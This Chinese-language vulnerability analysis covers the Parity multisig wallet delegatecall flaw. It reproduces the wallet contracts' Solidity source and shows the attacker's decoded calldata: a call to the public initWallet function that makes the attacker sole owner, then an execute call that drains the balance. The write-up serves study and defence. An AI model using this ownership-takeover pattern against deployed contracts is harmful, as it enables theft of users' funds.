# Paraity多重签名Delegatecall漏洞分析

在合约中一共有4个类分别是：WalletEvents、WalletAbi、WalletLibrary、，漏洞主要是利用了WalletLibrary以及Wallet合约

## WalletEvents

在该合约中主要定义了一些事件

```js
contract WalletEvents {
  event Confirmation(address owner, bytes32 operation);
  event Revoke(address owner, bytes32 operation);
  event OwnerChanged(address oldOwner, address newOwner);
  event OwnerAdded(address newOwner);
  event OwnerRemoved(address oldOwner);
  event RequirementChanged(uint newRequirement);
  event Deposit(address _from, uint value);
  event SingleTransact(address owner, uint value, address to, bytes data, address created);
  event MultiTransact(address owner, bytes32 operation, uint value, address to, bytes data, address created);
  event ConfirmationNeeded(bytes32 operation, address initiator, uint value, address to, bytes data);
}
```

## WalletAbi

在该合约中主要声明了一些函数但未实现

```js
contract WalletAbi {
  function revoke(bytes32 _operation) external;
  function changeOwner(address _from, address _to) external;
  function addOwner(address _owner) external;
  function removeOwner(address _owner) external;
  function changeRequirement(uint _newRequired) external;
  function isOwner(address _addr) constant returns (bool);
  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool);
  function setDailyLimit(uint _newLimit) external;
  function execute(address _to, uint _value, bytes _data) external returns (bytes32 o_hash);
  function confirm(bytes32 _h) returns (bool o_success);
}

```

## WalletLibrary

继承自WalletEvents，包含了对多重签名的所有操作，首先是状态变量

```js
  struct PendingState { //
    uint yetNeeded; //还需要签名的人数
    uint ownersDone; //已签名的人,其使用bitmap,有多少个1表示有多少人签名
    uint index; //与该PendingState对应的operate在m_pendingIndex中的索引
  }

  struct Transaction { //要执行的交易
    address to;
    uint value;
    bytes data;
  }

  //该合约的地址
  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;

  uint public m_required; //M-N签名中的M

  uint public m_numOwners; //M-N签名中的N

  uint public m_dailyLimit; //一天可以花的ether
  uint public m_spentToday; //当天已花的ether
  uint public m_lastDay; //更新日期的最后一天

  uint[256] m_owners; //N个人的地址,从索引1开始存放

  uint constant c_maxOwners = 250; //N最大值为250
  mapping(uint => uint) m_ownerIndex; //N地址到m_owners索引的映射
  mapping(bytes32 => PendingState) m_pending; //operate到PendingState的映射
  bytes32[] m_pendingIndex; //用于存储operate
  mapping (bytes32 => Transaction) m_txs; //operate到transaction的映射
```

下面列出了该合约的一些关键函数

```js
  modifier onlyowner { //只有owner才可以执行
    if (isOwner(msg.sender))
      _;
  }

  //只有签名人数达到M才会执行函数
  modifier onlymanyowners(bytes32 _operation) {
    if (confirmAndCheck(_operation))
      _;
  }
  //operate为对该合约某个函数的调用,本质为msg.data
  function confirmAndCheck(bytes32 _operation) internal returns (bool) {
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    if (ownerIndex == 0) return;

    var pending = m_pending[_operation];
    //该情况只可能在该operate不存在时才成立,因为在下边有yetNeeded<=1时会将该operate删除
    if (pending.yetNeeded == 0) {
      pending.yetNeeded = m_required;
      pending.ownersDone = 0;
      pending.index = m_pendingIndex.length++;
      m_pendingIndex[pending.index] = _operation;
    }
    // ownerIndexBit使用bitmap,当ownerIndexBit为00000100时,说明m_owners[1]对该operate签名了
    uint ownerIndexBit = 2**ownerIndex;
    if (pending.ownersDone & ownerIndexBit == 0) {
      Confirmation(msg.sender, _operation);
      if (pending.yetNeeded <= 1) { //签名人数达到M
        delete m_pendingIndex[m_pending[_operation].index];
        delete m_pending[_operation];
        return true;
      }
      else
      {
        pending.yetNeeded--;
        pending.ownersDone |= ownerIndexBit;
      }
    }
  }
  
  //初始化owner以及M
  function initMultiowned(address[] _owners, uint _required) internal {
    m_numOwners = _owners.length + 1;
    m_owners[1] = uint(msg.sender);
    m_ownerIndex[uint(msg.sender)] = 1;
    for (uint i = 0; i < _owners.length; ++i)
    {
      m_owners[2 + i] = uint(_owners[i]);
      m_ownerIndex[uint(_owners[i])] = 2 + i;
    }
    m_required = _required;
  }

  //撤销msg.sender对ownerIndex的签名,更新该operate的还需签名人数,以及对该operate签名的owner
  function revoke(bytes32 _operation) external {
    uint ownerIndex = m_ownerIndex[uint(msg.sender)];
    // make sure they're an owner
    if (ownerIndex == 0) return;
    uint ownerIndexBit = 2**ownerIndex;
    var pending = m_pending[_operation];
    if (pending.ownersDone & ownerIndexBit > 0) {
      pending.yetNeeded++;
      pending.ownersDone -= ownerIndexBit;
      Revoke(msg.sender, _operation);
    }
  }
  
  //将owner从from更改为to,并清空所有operate
  //只有签名人数达到M才会执行该函数
  function changeOwner(address _from, address _to) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_to)) return;
    uint ownerIndex = m_ownerIndex[uint(_from)];
    if (ownerIndex == 0) return;

    clearPending();
    m_owners[ownerIndex] = uint(_to);
    m_ownerIndex[uint(_from)] = 0;
    m_ownerIndex[uint(_to)] = ownerIndex;
    OwnerChanged(_from, _to);
  }

  //增加owner
  //只有签名人数到达M才会执行该函数
  function addOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    if (isOwner(_owner)) return;

    clearPending();
    if (m_numOwners >= c_maxOwners)
      reorganizeOwners();
    if (m_numOwners >= c_maxOwners)
      return;
    m_numOwners++;
    m_owners[m_numOwners] = uint(_owner);
    m_ownerIndex[uint(_owner)] = m_numOwners;
    OwnerAdded(_owner);
  }
  
  //移除owner,并对数组m_owner进行移动,清除所有operate
  //只有签名人数到达M才会执行该函数
  function removeOwner(address _owner) onlymanyowners(sha3(msg.data)) external {
    uint ownerIndex = m_ownerIndex[uint(_owner)];
    if (ownerIndex == 0) return;
    if (m_required > m_numOwners - 1) return;

    m_owners[ownerIndex] = 0;
    m_ownerIndex[uint(_owner)] = 0;
    clearPending();
    reorganizeOwners(); //make sure m_numOwner is equal to the number of owners and always points to the optimal free slot
    OwnerRemoved(_owner);
  }
  
  //更新M,并清空operate
  //只有签名人数到达M才会执行该函数
  function changeRequirement(uint _newRequired) onlymanyowners(sha3(msg.data)) external {
    if (_newRequired > m_numOwners) return;
    m_required = _newRequired;
    clearPending();
    RequirementChanged(_newRequired);
  }

  //验证某个owner是否对某个operate进行了签名
  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {
    var pending = m_pending[_operation];
    uint ownerIndex = m_ownerIndex[uint(_owner)];

    if (ownerIndex == 0) return false;

    uint ownerIndexBit = 2**ownerIndex;
    return !(pending.ownersDone & ownerIndexBit == 0);
  }

  //设置每天可以支出的ether,并更新时间
  function initDaylimit(uint _limit) internal {
    m_dailyLimit = _limit;
    m_lastDay = today();
  }

  //设置每天可以值出的ether
  //只有签名人数到达M才会执行该函数
  function setDailyLimit(uint _newLimit) onlymanyowners(sha3(msg.data)) external {
    m_dailyLimit = _newLimit;
  }
  
  //重置该天支出的ether
  //只有签名人数到达M才会执行该函数
  function resetSpentToday() onlymanyowners(sha3(msg.data)) external {
    m_spentToday = 0;
  }

  //设置每天可以支出的ether,更新时间,初始化owner,初始化M
  function initWallet(address[] _owners, uint _required, uint _daylimit) {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
  
  //销毁合约,并将合约的balance转账到_to中
  //只有签名人数到达M才会执行该函数
  function kill(address _to) onlymanyowners(sha3(msg.data)) external {
    suicide(_to);
  }

  //执行转账交易,当转账金额小于每天限制的金额时或者只需要一人签名时则直接转账
  //当转账金额大于每天限制的金额时,则创建该交易,存储到m_txs中,直到有M个人的签名才能执行转账
  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {
    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {
      address created;
      if (_to == 0) {
        created = create(_value, _data);
      } else {
        if (!_to.call.value(_value)(_data))
          throw;
      }
      SingleTransact(msg.sender, _value, _to, _data, created);
    } else {
      o_hash = sha3(msg.data, block.number);
      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {
        m_txs[o_hash].to = _to;
        m_txs[o_hash].value = _value;
        m_txs[o_hash].data = _data;
      }
      if (!confirm(o_hash)) {
        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);
      }
    }
  }

  //执行转账交易,成功执行后会将交易从m_txs中删除
  ////只有签名人数到达M才会执行该函数
  function confirm(bytes32 _h) onlymanyowners(_h) returns (bool o_success) {
    if (m_txs[_h].to != 0 || m_txs[_h].value != 0 || m_txs[_h].data.length != 0) {
      address created;
      if (m_txs[_h].to == 0) {
        created = create(m_txs[_h].value, m_txs[_h].data);
      } else {
        if (!m_txs[_h].to.call.value(m_txs[_h].value)(m_txs[_h].data))
          throw;
      }

      MultiTransact(msg.sender, _h, m_txs[_h].value, m_txs[_h].to, m_txs[_h].data, created);
      delete m_txs[_h];
      return true;
    }
  }

  //创建合约
  function create(uint _value, bytes _code) internal returns (address o_addr) {
    assembly {
      o_addr := create(_value, add(_code, 0x20), mload(_code))
      jumpi(invalidJumpLabel, iszero(extcodesize(o_addr)))
    }
  }
  
  //当删除一个owner后,数组元素可能不连续,该函数利用双指针将数组变得连续
  function reorganizeOwners() private {
    uint free = 1;
    while (free < m_numOwners)
    {
      while (free < m_numOwners && m_owners[free] != 0) free++;
      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;
      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)
      {
        m_owners[free] = m_owners[m_numOwners];
        m_ownerIndex[m_owners[free]] = free;
        m_owners[m_numOwners] = 0;
      }
    }
  }

  //判断花出value后是否会大于每天支出限制
  function underLimit(uint _value) internal onlyowner returns (bool) {
    if (today() > m_lastDay) {
      m_spentToday = 0;
      m_lastDay = today();
    }
    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {
      m_spentToday += _value;
      return true;
    }
    return false;
  }
  
  //返回从1970至今的天数
  function today() private constant returns (uint) { return now / 1 days; }

  //清除所有operate
  function clearPending() internal {
    uint length = m_pendingIndex.length;

    for (uint i = 0; i < length; ++i) {
      delete m_txs[m_pendingIndex[i]];

      if (m_pendingIndex[i] != 0)
        delete m_pending[m_pendingIndex[i]];
    }

    delete m_pendingIndex;
  }
```

## Wallet

与Walletlibrary类似

```js
contract Wallet is WalletEvents {
  function Wallet(address[] _owners, uint _required, uint _daylimit) {
    // Signature of the Wallet Library's init function
    bytes4 sig = bytes4(sha3("initWallet(address[],uint256,uint256)"));
    address target = _walletLibrary;

    uint argarraysize = (2 + _owners.length);
    uint argsize = (2 + argarraysize) * 32;

    assembly {
      mstore(0x0, sig)
      codecopy(0x4,  sub(codesize, argsize), argsize)
      delegatecall(sub(gas, 10000), target, 0x0, add(argsize, 0x4), 0x0, 0x0)
    }
  }

  function() payable {
    if (msg.value > 0)
      Deposit(msg.sender, msg.value);
    else if (msg.data.length > 0)
      _walletLibrary.delegatecall(msg.data);
  }

  function getOwner(uint ownerIndex) constant returns (address) {
    return address(m_owners[ownerIndex + 1]);
  }

  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {
    return _walletLibrary.delegatecall(msg.data);
  }

  function isOwner(address _addr) constant returns (bool) {
    return _walletLibrary.delegatecall(msg.data);
  }

  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;

  uint public m_required;

  uint public m_numOwners;

  uint public m_dailyLimit;
  uint public m_spentToday;
  uint public m_lastDay;

  uint[256] m_owners;
}
```

## 漏洞分析

在wallet合约中，回调函数使用delegatecall调用交易msg.data所指定的函数，而在walletlibrary合约中，initWallet函数是public的，因此可以替换到所有owner列表

```js
  function() payable {
    if (msg.value > 0)
      Deposit(msg.sender, msg.value);
    else if (msg.data.length > 0)
      _walletLibrary.delegatecall(msg.data);
  }

  function initWallet(address[] _owners, uint _required, uint _daylimit) {
    initDaylimit(_daylimit);
    initMultiowned(_owners, _required);
  }
```

攻击者通过向wallet函数转账，msg.data指定调用walletlibrary合约中的initwallet，并使用自己的账户地址作为owner地址，设置M为1，每天的限额为0x116779808c03e4140000

```js
Function: initWallet(address[] _owners, uint256 _required, uint256 _daylimit) ***

MethodID: 0xe46dcfeb
[0]:  0000000000000000000000000000000000000000000000000000000000000060
[1]:  0000000000000000000000000000000000000000000000000000000000000000
[2]:  00000000000000000000000000000000000000000000116779808c03e4140000
[3]:  0000000000000000000000000000000000000000000000000000000000000001
[4]:  000000000000000000000000b3764761e297d6f121e79c32a65829cd1ddb4d32
```

接下来，攻击者可以执行execute函数将wallet合约的ether全部转到自己的账户中

```js
  function execute(address _to, uint _value, bytes _data) external onlyowner returns (bytes32 o_hash) {
    if ((_data.length == 0 && underLimit(_value)) || m_required == 1) {
      address created;
      if (_to == 0) {
        created = create(_value, _data);
      } else {
        if (!_to.call.value(_value)(_data))
          throw;
      }
      SingleTransact(msg.sender, _value, _to, _data, created);
    } else {
      o_hash = sha3(msg.data, block.number);
      if (m_txs[o_hash].to == 0 && m_txs[o_hash].value == 0 && m_txs[o_hash].data.length == 0) {
        m_txs[o_hash].to = _to;
        m_txs[o_hash].value = _value;
        m_txs[o_hash].data = _data;
      }
      if (!confirm(o_hash)) {
        ConfirmationNeeded(o_hash, msg.sender, _value, _to, _data);
      }
    }
  }
```

以下是攻击者的msg.data，将to指定为自己的地址，转账金额为0x116779808c03e4140000，data为空，因此execute函数中直接会向攻击者转账

```js
Function: execute(address _to, uint256 _value, bytes _data) ***

MethodID: 0xb61d27f6
[0]:  000000000000000000000000b3764761e297d6f121e79c32a65829cd1ddb4d32
[1]:  00000000000000000000000000000000000000000000116779808c03e4140000
[2]:  0000000000000000000000000000000000000000000000000000000000000060
[3]:  0000000000000000000000000000000000000000000000000000000000000000
[4]:  0000000000000000000000000000000000000000000000000000000000000000
```

## 参考

[Parity多重签名合约Delegatecall漏洞回顾](https://cloud.tencent.com/developer/article/1171294)

[enhanced-wallet.sol](https://github.com/openethereum/parity-ethereum/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol)

